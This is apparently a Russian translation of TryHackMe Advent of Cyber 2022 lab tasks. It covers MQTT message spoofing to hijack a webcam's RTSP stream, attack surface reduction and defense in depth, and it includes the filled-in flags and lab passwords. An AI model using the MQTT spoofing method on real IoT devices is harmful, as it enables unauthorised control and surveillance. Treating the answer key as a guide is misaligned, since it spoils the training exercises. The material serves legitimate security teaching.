Сеть IoT или беспроводной протокол по-прежнему преследует те же цели, что и протоколы данных, то есть передачу 
данных, но достигает этого по-другому. Вместо того, чтобы полагаться на традиционные протоколы TCP, эти протоколы 
используют беспроводные технологии, такие как Wi-Fi, Bluetooth, ZigBee и Z-Wave, для передачи данных и связи между 
сущностями.   

В ходе выполнения этой задачи мы сосредоточимся на первой категории протоколов и на том, как они взаимодействуют с 
устройствами Интернета вещей. 

Итак, давайте подробнее рассмотрим протоколы данных Интернета вещей и то, что делает их... протоколами данных.

Протоколы обмена сообщениями и промежуточное программное обеспечение 

Поскольку передача данных является основной целью протоколов данных IoT , они обычно принимают форму  протокола 
обмена сообщениями ; то есть протокол обеспечивает  отправку  и  получение  сообщения   или  полезной нагрузки между 
двумя сторонами.  

Протоколы обмена сообщениями обеспечивают связь между двумя устройствами через независимый сервер (« промежуточное 
программное обеспечение ») или путем согласования метода связи между ними. 

Устройства обычно используют промежуточное ПО, поскольку они должны быть легкими и эффективными; например, 
устройство IoT может не поддерживать более надежный протокол, такой как HTTP . Сервер размещается между двумя 
клиентами, которые хотят общаться, чтобы преобразовать метод общения в средство, которое оба устройства могут понять,
учитывая их технологию.   

Схема промежуточного программного обеспечения, транслирующего данные между клиентом A и клиентом B

Вспомните, как мы упоминали, что совместимость протоколов устройств может быть проблемой; промежуточное программное 
обеспечение устраняет некоторые из связанных с этим проблем, но все равно может оказаться неспособным преобразовать 
все сообщения.  

Ниже представлен краткий обзор популярных протоколов обмена сообщениями, используемых устройствами Интернета вещей .



Функциональность модели публикации/подписки
Протоколы обмена сообщениями обычно используют модель публикации/подписки , в частности протокол MQTT . Модель 
полагается на брокера для согласования "опубликованных" сообщений и запросов "подписки" . Давайте сначала рассмотрим 
схему этого процесса, а затем разберем ее подробнее.  

Схема брокера, обеспечивающего связь между издателем и подписчиком

На основании вышеприведенной диаграммы,

Издатель отправляет свое сообщение брокеру.
Брокер продолжает ретрансляцию сообщения до тех пор, пока не будет опубликовано новое сообщение.
Абонент может попытаться подключиться к брокеру и получить сообщение.
Протокол должен работать фантастически, если для одного устройства нужен один брокер, но что, если несколько типов 
данных необходимо отправлять с одного устройства или нескольким издателям и подписчикам необходимо подключиться к 
одному брокеру? Использование более одного брокера может быть осуществимо, но увеличивает ненужные накладные расходы 
и использование сервера.   

Безопасный метод связи также должен гарантировать целостность сообщений, то есть один издатель не должен перезаписывать другой.

Чтобы решить эти проблемы, брокер может хранить несколько сообщений от разных издателей, используя темы . Тема — это 
полупроизвольное значение, заранее согласованное издателем и подписчиком и отправленное вместе с сообщением. Формат 
темы обычно имеет вид <name>/<id>/<function>. Когда отправляется новое сообщение с заданной темой, брокер сохранит 
или перезапишет его под темой и передаст подписчикам, которые «подписались» на него.   

Ниже представлена диаграмма, на которой показаны два издателя, отправляющие разные сообщения, связанные с темами.

Схема отправки сообщений с темами несколькими издателями одному брокеру

Ниже представлена диаграмма получения сообщений несколькими подписчиками из разных тем брокера.

Диаграмма нескольких подписчиков, запрашивающих сообщения из нескольких тем у одного брокера

Обратите внимание на асинхронный характер этой коммуникации; издатель может публиковать в любое время, а подписчик 
может подписаться на тему, чтобы увидеть, переслал ли брокер сообщения. Обычно подписчики и издатели будут 
продолжать попытки подключиться к брокеру в течение определенного периода времени.  

Что ж, теперь мы должны понимать функциональность этой модели, но зачем ее использовать устройству IoT ?

Модель публикации/подписки полезна для любых данных, которые поддерживаются асинхронно или принимаются несколькими 
различными устройствами от одного издателя. 

Типичным примером модели публикации/подписки может быть термостат, публикующий свою текущую температуру. Несколько 
термостатов могут публиковать данные одному брокеру, а несколько устройств могут подписываться на термостат, от 
которого они хотят получать данные.  

MQTT как протокол также является легким, имеет небольшие габариты и минимальную пропускную способность.

Являются ли протоколы IoT изначально уязвимыми?
Мы определили связь между протоколами IoT и сетевыми службами, а также то, как функционируют протоколы обмена 
сообщениями. Это все еще оставляет вопрос о том, насколько безопасны протоколы IoT. 

Давайте применим это к тому, с чем мы более знакомы, HTTP. «Уязвимости HTTP» часто относятся к уязвимости в 
программном обеспечении/приложении, созданном на основе протокола; это не означает, что протоколы не имеют 
уязвимостей, но они, как правило, имеют строгие требования и требуют пересмотра перед выпуском или публичным принятием.  

Аналогично, протоколы IoT изначально не являются уязвимыми, так что же делает устройство IoT небезопасным?

Прежде чем дать более формальное объяснение, давайте рассмотрим настройки MQTT по умолчанию при первом развертывании.
Брокер MQTT назначает всем подключенным к нему устройствам доступ на чтение/запись ко всем темам; то есть любое 
устройство может публиковать и подписываться на тему. Сначала эта идея может нас устраивать; в примере с термостатом 
мы только передаем температуру, поэтому целостность данных не должна быть проблемой. Но давайте углубимся в эту 
проблему подробнее.    

Наши данные должны максимально точно соответствовать лучшим практикам CIA (Конфиденциальность, Целостность и 
Доступность); то есть данные не должны читаться или изменяться неавторизованными источниками и должны быть доступны 
авторизованным пользователям. В соответствии с лучшими практиками должны быть реализованы аутентификация и 
авторизация, чтобы не допустить компрометации потенциально недобросовестными субъектами любого принципа триады CIA.

Каков риск для устройств IoT, если не учитывать передовые практики? Риск почти полностью зависит от поведения 
устройства. Допустим, устройство доверяет издателю MQTT и анализирует данные или команды для выполнения действий, 
влияющих на настройки устройства. Злоумышленник может отправить вредоносное сообщение для выполнения 
непреднамеренных действий. Например, термостат отправляет сообщение определенного формата брокеру, а подписчик 
анализирует сообщение и изменяет температуру. Злоумышленник может отправить свое сообщение за пределы 
предполагаемого приложения (например, мобильного приложения), чтобы изменить температуру устройства. Хотя этот 
пример может показаться скромным, представьте, какое влияние это может оказать на другие устройства с последствиями 
или критически важные устройства, которые имеют важное значение для функционирования общества и/или экономики.

Подводя итог, экземпляр MQTT может быть небезопасным из-за ненадлежащих практик регулирования данных. Экземпляр 
может быть уязвимым, если поведение устройства позволяет злоумышленнику выполнять вредоносные действия из ожидаемого 
взаимодействия.  

Обратите внимание на различие между небезопасной и уязвимой реализацией: небезопасная реализация может позволить 
злоумышленнику воспользоваться уязвимостью, но это не означает, что реализация изначально уязвима. 

В следующем задании мы расширим эту идею и попытаемся определить методы, которые можно использовать для определения 
поведения данного устройства. 

### Злоупотребление поведением устройства
Прежде чем перейти к практическому разделу, давайте рассмотрим, как можно получить информацию о поведении устройства. 

Мы определили, что устройства IoT уязвимы из-за поведения их приложений. Теперь давайте кратко рассмотрим, как мы 
можем проанализировать поведение устройства на предмет уязвимых точек входа и как их можно использовать не по 
назначению.  

Злоумышленник может узнать о поведении устройства с помощью прослушивания коммуникаций, анализа исходного кода или 
документации. 

Сниффинг коммуникаций может определить используемый протокол, адрес промежуточного ПО или брокера и поведение 
коммуникации. Например, незашифрованные HTTP- запросы отправляются на центральный сервер, который затем 
преобразуется в пакеты CoAP. Мы можем наблюдать за HTTP- пакетами и искать темы или форматы сообщений, которые 
поставщики должны скрывать, например, настройки, команды и т. д., для взаимодействия с устройством.   
Анализ исходного кода может дать вам прямое представление о том, как устройство анализирует отправленные данные и 
как они используются. Анализ может идентифицировать информацию, похожую на перехват связи, но может выступать в 
качестве более надежного и определенного источника информации.  
Документация дает вам четкое понимание стандартной функциональности устройства или конечной точки. Недостатком 
использования только документации в качестве средства идентификации является то, что она может упускать из виду 
конфиденциальные полезные нагрузки, темы или другую информацию, которая обычно не имеет отношения к конечному 
пользователю, что мы, как злоумышленники, хотим получить.   

После определения поведения мы можем использовать клиенты для взаимодействия с устройствами и отправки вредоносных 
сообщений/полезных данных. 

Чтобы закрепить эту концепцию, вернемся к примеру с термостатом и посмотрим, как злоумышленник может попытаться 
получить контроль над устройством.  

Большинство устройств IoT имеют идентификатор устройства, который они используют для идентификации себя для других 
устройств, и который другие устройства могут использовать для идентификации целевого устройства. Устройства должны 
обмениваться этим идентификатором устройства, прежде чем может произойти какое-либо другое взаимодействие. В случае 
MQTT идентификатор устройства обычно обменивается путем публикации сообщения, содержащего идентификатор устройства, 
в заранее известной теме, на которую может подписаться любой.    

Как только злоумышленник узнает идентификатор устройства и поведение целевого устройства, он может попытаться 
нацелиться на определенные темы или форматы сообщений. Эти темы могут доверять источнику сообщения и выполнять 
некоторые действия вслепую (например, изменять температуру, изменять место публикации и т. д.)  

В нашем сценарии предварительная информация была выявлена Recon McRed посредством анализа оборудования и обратной 
разработки прошивки. Известно, что устройство веб-камеры использует протокол MQTT, и у нас есть список потенциальных 
тем, на которые мы можем нацелиться. Прежде чем анализировать эти потенциально уязвимые темы, давайте рассмотрим, 
как мы можем взаимодействовать с конечной точкой MQTT в обычном режиме.    

### Взаимодействие с MQTT

Как мы взаимодействуем с MQTT или другими протоколами IoT ? Разные протоколы будут иметь разные библиотеки или 
другие средства взаимодействия с ними. Для MQTT есть две часто используемые библиотеки, которые мы обсудим, а именно 
Paho и  Mosquitto . Paho — это библиотека Python, которая предлагает поддержку всех функций MQTT. Mosquitto — это 
набор утилит MQTT, включающий брокера и клиентов публикации/подписки, которые мы можем использовать из командной 
строки.    

В этом задании мы познакомимся с клиентами Mosquitto и их функциональными возможностями; в следующем задании мы 
задействуем клиентов на уязвимом устройстве, чтобы получить практические навыки. 

### Подписка на тему

Мы можем использовать клиентскую утилиту mosquitto_sub для подписки на брокера MQTT.

По умолчанию утилита подписки подключает брокера localhost и требует только определения темы с помощью флага -t или  
—topic. Ниже приведен пример подключения к localhost и подписки на тему  device/ping. 

`mosquitto_sub -t device/ping`

Вы также можете указать удаленного брокера с помощью -h флага. Ниже приведен пример подключения к example.thm и 
подписки на тему  device/thm .

```mosquitto_sub -h example.thm -t device/thm```

### Публикация в теме

Мы можем использовать клиентскую утилиту mosquitto_pub для публикации на брокере MQTT.

Публикация сообщения в теме почти идентична публикации клиента подписки. Однако на этот раз нам нужно включить флаг 
-m или —messageдля обозначения нашего сообщения/полезной нагрузки. Ниже приведен пример публикации в теме,  
устройство/информация на хосте,  example.thm с сообщением  "Это пример". 

    ```mosquitto_pub -h example.thm -t device/info -m "This is an example"```

Для обоих клиентов есть несколько важных дополнительных флагов, которые мы кратко упомянем:
- -d: Включает отладочные сообщения.
- -i или —id: Указывает идентификатор для идентификации клиента на сервере.
- -p или —port: Указывает порт, который использует брокер. По умолчанию используется порт 1883.
- -u или —username: Используется для указания имени пользователя для аутентификации.
- -P или —password: Используется для указания пароля для аутентификации.
- —url: Используется для указания имени пользователя, пароля, хоста, порта и темы в одном URL-адресе.
Устройство, использующее MQTT, будет создавать сообщения как средство общения аутентично. Как злоумышленник, мы 
  попытаемся представить наш источник публикации как законный источник в надежде, что другая сторона будет 
  взаимодействовать с сообщением так, как будто это было бы подлинное сообщение, чтобы предоставить нам 
  непреднамеренное поведение.    

### Практическое применение
Мы рассмотрели всю информацию, необходимую для успешного подхода к эксплуатации небезопасной реализации передачи 
данных устройства IoT . Давайте попробуем применить то, что мы узнали, к неизвестной веб-камере, обнаруженной в 
Мастерской Санты.  

Сначала запустим виртуальную машину, нажав кнопку Start Machine в верхней части этой задачи. Пожалуйста, дайте 
машине как минимум 5 минут на развертывание, прежде чем взаимодействовать с ней. Вы можете взаимодействовать с 
виртуальной машиной с помощью AttackBox или вашего VPN- подключения.  

Примечание: поле атаки в браузере было соответствующим образом настроено для этой задачи, и мы настоятельно 
рекомендуем использовать его на протяжении этой задачи. Если вы используете свою личную виртуальную машину, мы 
рассмотрим некоторые конкретные конфигурации, которые вам необходимо выполнить для успешной атаки.    

Как кратко изложено ранее, нам известно следующее:
- Устройство взаимодействует с брокером MQTT для публикации и подписки на предварительно определенные темы.
- Брокер устройств находится по адресу MACHINE_IP.
- Из реверс-инжиниринга прошивки мы знаем, что устройство использует эти две темы
device/init
Публикует идентификатор текущего устройства.
device/<id>/cmd
Подписывается на тему, связанную с идентификатором устройства, для получения команд и настроек.
Известно ,  что устройство использует протокол RTSP ( протокол потоковой передачи в  реальном  времени ) для 
  потоковой передачи входного сигнала. 
Если злоумышленник может контролировать, куда и как пересылается поток RTSP, он может перенаправить его на 
  контролируемый им сервер RTSP. 
Тема device/<id>/cmd может определять поведение с помощью числового параметра CMD и возможности анализа пары 
  ключ-значение, которая будет использоваться для взаимодействия с устройством.
Мы пока не знаем, как ведет себя тема команды или какой формат она ожидает получить. Вам решать, как создать 
  вредоносное сообщение, нацеленное на тему команды. Если вы ищете вызов, мы предоставили вам небольшой фрагмент 
  исходного кода, извлеченный из прошивки устройства, который вы можете использовать для сбора информации о 
  поведении связи. В противном случае мы собрали необходимую вам информацию с ожидаемым форматом и поведением 
  устройства.     

Обратите внимание, что из-за потери пакетов передача потока может занять до одной минуты.

### Ответить на вопросы ниже
На каком порту работает Mosquitto? 

```commandline
1883
```
Перечисляется ли  тема устройства/инициализации  Nmap во время сканирования скриптом всех портов? (да/нет)
```commandline
y
```
Какую версию Mosquitto использует устройство?
```commandline
1.6.9
```
Какой флаг получается при просмотре RTSP-потока? 
```commandline
THM{UR_CAMERA_IS_MINE}
```
Если вы хотите узнать больше, посетите комнату «Внедрение команд» или модуль «Исследование уязвимостей» ! 
```commandline
Ответ не нужен
```

## Задание 27
Посмотрите видео-обучение Simply Cyber на 22-й день  здесь !

МакСкиди хочет улучшить состояние безопасности сети Санты, извлекая уроки из недавних попыток сорвать Рождество. В 
качестве первого шага она планирует внедрить не требующие больших усилий, но имеющие высокую ценность изменения, 
которые значительно улучшат состояние безопасности.  

### Цели обучения
Чтобы помочь Макскиди с ее улучшениями, мы изучим некоторые концепции и оценим некоторые шаги, которые нужно предпринять. Они будут включать:
- Понять, что такое вектор атаки.
- Понять концепцию поверхности атаки.
- Несколько практических примеров методов сокращения поверхности атаки, которые McSkidy может использовать для 
  укрепления сети Санты.


### Итак, начнем.

Векторы атакиИзображение, на котором изображен Йети-бандит, держащий в руках конфету в качестве оружия. Оружие 
отмечено как вектор атаки 
Вектор атаки — это инструмент, метод или метод, используемый для атаки на компьютерную систему или сеть. Если мы 
сопоставим векторы атаки с физическим миром, векторами атаки будут оружие, используемое противником, например, мечи, 
стрелы, молоты и т. д. Неполный список примеров векторов атаки в кибербезопасности включает следующее:   
- Фишинговые письма; обманные письма, которые часто отправляются от имени другого человека и просят жертву выполнить 
  действие, которое ставит под угрозу ее безопасность. 
- Атаки типа «отказ в обслуживании» ( DoS ) или «распределенный отказ в обслуживании» ( DDoS ); отправка такого 
  количества запросов на веб-сайт или веб-приложение, что они достигают своих пределов и больше не могут обслуживать 
  законные запросы. 
- Веб-атаки Drive-By; уязвимости веб-браузеров, которые ставят под угрозу безопасность жертвы, просто посещая веб-сайт.
- Эксплуатация неисправленной уязвимости; недостаток в инфраструктуре, подключенной к Интернету, например веб-сервере 
  или сетевом интерфейсе, который используется для получения контроля над инфраструктурой.
- Поверхность атаки Изображение, показывающее эльфа Синей команды в доспехах и со щитом. Незащищенная часть тела эльфа 
  отмечена как поверхность атаки


`Поверхность атаки` — это площадь поверхности жертвы атаки, которая может быть затронута вектором атаки и причинить 
  ущерб. Продолжая наш пример физического мира, поверхность атаки будет включать небронированное тело солдата, 
  которое может быть повреждено атакой меча, стрелы или молота и т. д. В кибербезопасности поверхность атаки обычно 
  будет содержать следующее:    

- Почтовый сервер, используемый для отправки и получения электронных писем.
- Веб-сервер с выходом в Интернет, предоставляющий посетителям веб-сайт.
- Машины конечного пользователя, которые люди используют для подключения к сети.
- Людьми можно манипулировать и обманом заставить их передать контроль над сетью злоумышленнику с помощью социальной 
  инженерии.

### Уменьшение поверхности атаки
Как мы могли заметить, поверхность атаки не может быть устранена, если только не убежать с поля боя. Ее можно только 
сократить. Греческая фаланга является прекрасным примером сокращения поверхности атаки, как показано на рисунке. На 
рисунке фронт обороняющейся армии прикрыт их щитами, тогда как стены прохода закрывают стороны, не оставляя 
атакующему места для нанесения урона защитникам, не натолкнувшись на их оборону. Вот как спартанская армия могла 
сдерживать гораздо более многочисленную персидскую армию в течение нескольких дней в битве при Фермопилах.     

Изображение, на котором изображены эльфы Синей команды в сомкнутом строю греческой фаланги, окруженные горами. 
Поверхность атаки уменьшена из-за щитов спереди и гор по бокам. 

Однако это сокращение поверхности атаки работает для оружия того времени. Эта техника не повлияет на поверхность 
атаки против современного оружия.  

В кибербезопасности наиболее безопасным компьютером является тот, который выключен и кабели отсоединены. Однако это 
невыполнимо для выполнения критических операций, зависящих от компьютеров. Поэтому лидеры кибербезопасности 
стремятся поддерживать работу операций с минимально возможной поверхностью атаки. Мы можем рассматривать цель как 
создание цифрового эквивалента греческой фаланги.    

### Примеры сокращения поверхности атаки
Теперь, когда мы поняли концепцию, лежащую в основе сокращения поверхности атаки, давайте определим векторы атак, 
которые могут быть использованы против инфраструктуры Санты. Давайте поможем Макскиди разработать защиту греческой 
фаланги, чтобы минимизировать поверхность атаки.   

### Сомкните ряды:
сайт Санты был взломан ранее. При расследовании этой атаки McSkidy обнаружил, что на сервере, где размещался сайт, 
был открыт порт SSH . Это привело к тому, что злоумышленник использовал этот открытый порт для входа. McSkidy закрыл 
этот порт.    

### Установите щиты:
хотя открытый порт SSH был защищен паролем, пароль был недостаточно надежным, чтобы противостоять попытке подбора. 
McSkidy внедрил более сильную политику паролей, чтобы затруднить подбор. Более того, тайм-аут блокировал 
пользователя после пяти попыток ввода неверного пароля, делая атаки подбором более дорогими и менее осуществимыми.  

### Контролируйте поток информации:
команда McSkidy сообщила ей о репозитории GitHub, содержащем конфиденциальную информацию, включая некоторые учетные 
данные. Эта информация могла быть вектором атаки, нацеленной на инфраструктуру Санты. Эта информация была сделана 
конфиденциальной, чтобы заблокировать этот вектор атаки. Более того, были разработаны передовые методы, 
гарантирующие, что учетные данные и другая конфиденциальная информация не будут переданы в репозитории GitHub.   

Остерегайтесь обмана:
еще одним вектором атаки, используемым для проникновения в сеть Санты, были фишинговые письма. McSkidy определил, 
что защита от фишинга не была включена, что привело к тому, что все такие письма попадали в почтовые ящики 
сотрудников Санты. McSkidy включил защиту от фишинга на почтовом сервере Санты, чтобы отфильтровывать поддельные и 
фишинговые письма. Все письма, идентифицированные как фишинговые или поддельные, были отброшены и не попали в 
почтовые ящики сотрудников Санты.    

Приготовьтесь к противодействию человеческой ошибке:
фишинговое письмо, нацеленное на сотрудников Санты, содержало документ, содержащий вредоносные макросы. Чтобы 
снизить риск того, что вредоносные документы на основе макросов скомпрометируют инфраструктуру Санты, Макскиди 
отключил макросы на конечных компьютерах, используемых сотрудниками Санты, чтобы избежать вредоносных атак на основе 
макросов.   

Укрепляйте каждого солдата:
Макскиди хотела сократить поверхность атаки с точки зрения каждой конечной точки. До сих пор она предприняла шаги по 
укреплению сети в целом. Для укрепления каждой конечной точки она воспользовалась правилами Microsoft Attack Surface 
Reduction . Хотя эти правила были встроены в продукт Microsoft Defender for Endpoint, она воспользовалась этими 
правилами и создала аналогичный набор правил для своей собственной платформы EDR .    

Сделать защиту неуязвимой:
Чтобы еще больше укрепить инфраструктуру, McSkidy провел сканирование уязвимостей, выделив некоторые уязвимости в 
инфраструктуре, выходящей в интернет. McSkidy исправил эти уязвимости, обнаруженные в инфраструктуре Санты, 
выходящей в интернет, чтобы избежать эксплуатации.  

После реализации этих шагов МакСкиди немного успокоилась. Однако она поняла, что хотя ее поверхность атаки 
сократилась, ей все равно нужно быть бдительной, чтобы избежать любых инцидентов. Возвращайтесь завтра, чтобы узнать,
какие еще шаги предпринимает МакСкиди для укрепления своей защиты. Увидимся!  

### Ответить на вопросы ниже
Следуйте инструкциям на приложенном статическом сайте, чтобы помочь Макскиди сократить ее поверхность атаки против 
атак Йети. Используйте флаг в качестве ответа, чтобы выполнить задание. 

```commandline
THM{4TT4CK SURF4C3 R3DUC3D}
```
Если вы хотите глубже изучить киберзащиту, почему бы не начать с модуля «Управление угрозами и уязвимостями»? 

```commandline
Ответ не нужен
```

## Задание 28
Посмотрите видео-обучение Марка к 23-му дню  здесь !

Все ваши усилия накладываются друг на друга, чтобы привести вас прямо в этот момент. Санта и команда безопасности так гордятся вами за то, что вы были с нами до сих пор. Вы уже практически член команды SSOC! Осталось усвоить еще одну вещь: урок, который может полностью изменить ваш взгляд на безопасность и подход к ней.

Во всех предыдущих задачах по крайней мере один раз затрагивались вопросы многослойной защиты и сокращения поверхностей атак. Написание безопасного кода и способность реагировать и анализировать различные части цепочки атак, среди прочего, являются важными для поддержания обороноспособности Позы Безопасности Санты. В этой задаче мы сосредоточимся на том, что в кругах безопасности официально известно как Глубокая Защита, которая является более общей и всеобъемлющей темой, чем предыдущие по отдельности.

Основной образ мышления

Основная идея, на которой основана Defense in Depth, заключается в том, что не существует серебряной пули, которая бы победила все проблемы безопасности организации. Ни один защитный механизм не может защитить вас от плохого внешнего мира.

Сопоставление прошлого и современных взглядов на оборонительную безопасность

Стены замка построены так, чтобы выдерживать осады и заграждения, а также укреплены и укомплектованы людьми, чтобы защищать от грабителей и мародеров. Тем не менее, несмотря на все эти усилия и старания по поддержанию и защите этой меры безопасности, нападающие рано или поздно ее прорвут, и в зависимости от реакции защитников в стенах замка, это может стать началом их конца.

Охранный ЭльфДолгое время, а может быть, и до сегодняшнего дня, многие организации рассматривали свою позицию безопасности так же, как средневековые лорды: сильный акцент на защите стен замка — периметра, так сказать. Однако, как и у средневековых лордов, после того, как периметр нарушен, и в зависимости от реакции организации, для них это тоже в значительной степени сделано.

Но не волнуйтесь! Современные оборонительные команды безопасности уходят от этого мышления и переходят на более надежный подход. Помнить, что стена замка, хотя и важна, не является единственным способом защитить организацию, признавать реальность того, что в какой-то момент порох будет обнаружен и, следовательно, будет использована единственная точка отказа, и иметь дополнительные уровни защиты, особенно для конкретных драгоценностей короны  , на которые могут нацеливаться плохие парни, — вот некоторые из основ, которые составляют современную позицию безопасности защищаемых организаций.

Срыв целей противника

Глубокоэшелонированная оборона в основном направлена ​​на срыв достижения целей противника, то есть на смещение акцента с «просто» обеспечения безопасности периметра на обеспечение безопасности всего пути, по которому противнику придется идти от периметра к драгоценностям короны.

Давайте рассмотрим это с точки зрения трех различных уровней защиты:

Первый уровень — это сосредоточение на безопасности периметра. В периметре присутствуют отличные механизмы предотвращения и, по сути, полное доверие внутри него; таким образом, как только периметр будет обойден, организация практически полностью отдается на милость противника.
Второй уровень имеет защитные слои; однако акцент делается исключительно на предотвращении. Он не использует «знание своей среды»; даже если враждебные цели могут быть предотвращены в некоторой степени, есть упущенная возможность с точки зрения обнаружения и, следовательно, оповещения и реагирования. Предотвращение — это хорошо, но ключ к победе над плохими парнями — это видимость того, что они делают.
Третий уровень имеет хорошо продуманные защитные слои, использующие стратегическое применение датчиков, эффективное создание аналитики и эффективные возможности оповещения и реагирования команды безопасности. Профилактические меры здесь не только связаны с обнаружением и оповещением, но и с немедленным и эффективным реагированием.
Первый уровень выше можно рассматривать как организацию, которая использует надежные средства защиты периметра, такие как межсетевые экраны веб-приложений (WAF), межсетевые экраны периметра сети и даже демилитаризованную зону ( DMZ ), но еще не внедрила внутреннюю сетевую безопасность и механизмы нулевого доверия еще не внедрены.

Второй уровень можно рассматривать как организацию, которая использует первый уровень защиты, но с более эффективными мерами внутренней безопасности, такими как сегментация сети, реализация принципа нулевого доверия, реализация принципа минимального привилегированного доступа и даже защищенные хосты и сети. Наличие этого уровня на самом деле очень хорошо; однако, забывать, что профилактические устройства могут использоваться и для возможностей обнаружения, — это упущенная возможность.

Третий уровень можно рассматривать как использование преимуществ первого и второго уровней для наращивания возможностей обнаружения и реагирования организации посредством эффективного сбора журналов и хорошо продуманной аналитики. Здесь все замыкается. От нас не только ожидают, что мы будем хороши в многоуровневом наложении превентивных мер против атак, но и должны быть способны реагировать на них, если и когда эти защитные возможности будут обойдены.

Бандит Йети: Мерзость на один день

Давайте рассмотрим следующий сценарий в качестве примера: предположим, что противник смог проникнуть через нашу периметральную оборону с помощью успешной кампании целевого фишинга. Ему нужно будет пройти через защищенную среду, полную растяжек и ловушек.

Он может захватить учетную запись конкретного пользователя, но поскольку мы правильно реализовали принцип доступа с наименьшими привилегиями, он будет ограничен в том, с чем он может работать. Он может перейти к другому пользователю с лучшими привилегиями через pass-the-hash. Тем не менее, поскольку у нас есть хорошие механизмы регистрации и возможности обнаружения, наши аналитики будут точно знать, как выглядит pass-the-hash, поэтому мы подхватим эту активность. Наша кавалерия будет предупреждена, чтобы немедленно отреагировать и устранить эту конкретную брешь.

Помните, что основное различие между уровнями 2 и 3 заключается в сочетании этих защитных слоев и механизмов обнаружения и реагирования, что позволяет обеспечить согласованную и всестороннюю систему безопасности.

Целью многослойной защиты является ограничение возможности для ошибок, которые может иметь противник. В этом смысле плохие парни должны сделать все правильно, но нам нужно, чтобы они совершили ошибку только один раз.

Чтобы донести эту мысль, давайте рассмотрим, каково это — оказаться на месте плохого парня.

Мы подготовили для вас небольшую игру. Цель игры проста: заполучить список Непослушных или Хороших в хранилище Санты. Будет три уровня; каждый последующий создает защитный слой поверх предыдущего и будет немного сложнее. Помните, что вы играете за Плохого Йети, поэтому убедитесь, что вас не поймают!

Нажмите  кнопку «Просмотреть сайт»  в верхней части задачи, чтобы запустить статический сайт.

Обзор игры / обсуждение после игры

Пройдя игру и испытав на себе различные уровни сложности, с которыми может столкнуться противник при построении многоуровневой обороны, вы, должно быть, уже поняли, что многоуровневая оборона — это круто!

Уровни игры являются аналогией трех различных уровней защиты, обсуждавшихся ранее в этом задании. Далее, цепочку атак в игре можно интерпретировать следующим образом: Исполнительный помощник Санты (EA) получает электронное письмо с фишинговым сообщением. Установив точку опоры, Плохой Йети сразу понимает, что у EA нет доступа к списку Непослушных или Хороших. Поэтому после некоторого перечисления и даже принятия личности Санты в какой-то момент, Плохой Йети смог завладеть заветным списком и фактически испортить Рождество. Хорошо, что это была всего лишь игра!

Хотя причина этого в том, чтобы показать различные эффекты наличия защитных слоев с точки зрения плохого парня, с другой стороны, реальность внедрения этого для защитных команд безопасности более итеративна и циклична. Взломы и истинно-положительные обнаружения показывают области, требующие улучшения, и степень нашей видимости в организации соответственно. Атаки, успешные или нет, должны дополнительно информировать о защитных шагах и подходах. Если мы узнали, что противник смог использовать определенную уязвимость, то будьте уверены, что уязвимость будет исправлена, а приложение, представляющее ее, будет защищено.

Резюме и заключение

Современные методы обеспечения безопасности состоят из слоев. Остановка атак с самого начала очень полезна, даже идеальна, но не всегда возможна. Каждый может и будет скомпрометирован — это лишь вопрос времени, и каждый из нас должен помешать им делать то, что они намереваются делать, и на каждом этапе пути.

### Ответить на вопросы ниже
Случай 1: Какой пароль от хранилища Санты?
```commandline
S3cr3tV@ultPW
```
Случай 1: Что такое флаг?
```commandline
THM{EZ_fl@6!}
```
Случай 2:  Что больше всего нравится Сантe?
```commandline
MilkAndCookies
```
Случай 2: Какой пароль от хранилища Санты?
```commandline
3XtrR@_S3cr3tV@ultPW
```
Случай 2: Что такое флаг?
```commandline
THM{m0@r_5t3pS_n0w!}
```
Случай 3: Что больше всего нравится помощнику руководителя?
```commandline
BanoffeePie
```
Случай 3: Какой предыдущий пароль у Санты?
```commandline
H0tCh0coL@t3_01
```
Случай 3: Какой сейчас пароль у Санты?
```commandline
H0tCh0coL@t3_02
```
Случай 3: Какова первая часть пароля хранилища?
```commandline
N3w4nd1m
```
Случай 3: Какова вторая часть пароля хранилища?
```commandline
Pr0v3dV@ultPW
```
Случай 3: Какой пароль от хранилища Санты?
```commandline
N3w4nd1mPr0v3dV@ultPW
```
Случай 3: Что такое флаг?
```commandline
THM{B@d_Y3t1_1s_n@u6hty}
```
Что такое «Код Санты»?
```commandline
2845
```
Миссия ELFossible: Что такое флаг «Отвратительный на день»?
```commandline
THM{D3f3n5e_1n_D3pth_1s_k00L!!}
```
Если вы хотите узнать больше о смягчении и управлении действиями потенциальных противников, ознакомьтесь с  модулем « Информация об угрозах»  ! 
```commandline
Ответ не нужен
```

## Задание 29
Большое спасибо за участие в мероприятии Advent of Cyber в этом году!

### Ответить на вопросы ниже
Пожалуйста, помогите нам стать лучше, ответив  на этот 5-минутный опрос .  Не забудьте захватить флаг, прежде чем нажать «Отправить»!

```commandline
THM{AoC2022!thank_you!}
```
Продолжайте обучение по  программам Pre Security ,  Jr Penetration Tester или  SOC Level 1  !
```commandline
Ответ не нужен
```
Победители будут объявлены  28 декабря  — до этого времени у вас есть время выполнить задания. Помните, чем больше вопросов вы ответите, тем выше ваши шансы на победу! 

Победители ежедневного приза за последнюю неделю мероприятия будут объявлены в Twitter в среду, 28 декабря. 


```commandline
Ответ не нужен
```

## Задание 30
[Кошмар перед Эльфмасом - Конец]
МакСкиди смотрит, как сани Санты трогаются с места, попивая горячий шоколад

Ах, какой месяц! Когда МакСкиди наблюдала, как сани Санты, нагруженные подарками, отъезжают, она вздохнула с облегчением.
Мы сделали это! 

МакСкиди ходит по мастерской Санты, пока другие эльфы занимаются своими незаконченными делами.

Осмотрев мастерскую, она увидела, как команда SOC Санты работает над своими задачами.
Некоторые устанавливали дополнительную защиту, некоторые внедряли новые политики безопасности,
а некоторые также пробовали новые навыки (и шляпы!).

Бандит Йети уходит из поместья Санты

Есть некоторые вещи, которые МакСкиди не видит, но вам было бы важно знать о них. 

Бандит Йети разрушает доску своим коварным планом на 2022 год

Бандит Йети покинул эту местность и вернулся в свое логово, на данный момент побежденный.

Йети вычеркивает 2022 год и пишет 2023 год, чтобы начать планирование на следующий год

Если бы мы могли заглянуть в его комнату планирования, мы бы увидели зачатки
нового плана, но давайте не будем беспокоиться об этом сегодня!

МакСкиди входит в комнату SOC

Когда Макскиди вернулась в свой кабинет, она посмотрела на свой стол,
где всего 24 дня назад лежала зловещая карточка. 
Теперь на этом месте лежал свиток с огромным списком дел по безопасности. 

МакСкиди разворачивает свиток со списком дел по безопасности

Они все усердно работали, чтобы очистить как можно больше предметов, но многие остались.
Безопасность никогда не заканчивается!

МакСкиди вычеркивает пункт «Спасите Рождество» из списка

